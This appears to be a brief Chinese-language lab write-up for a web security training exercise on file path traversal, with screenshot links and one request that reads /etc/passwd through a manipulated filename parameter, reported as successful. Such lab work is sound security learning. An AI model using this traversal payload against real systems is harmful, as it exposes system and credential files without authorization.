# Lab: File path traversal, simple case

---

进入靶场

![image-20241217152046092](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20241217152046092.png)





抓包：

![image-20241217152003421](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20241217152003421.png)

我们尝试修改目录地址

```python
/image?filename=../../../etc/passwd
```

成功访问！！！

![image-20241217152129594](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20241217152129594.png)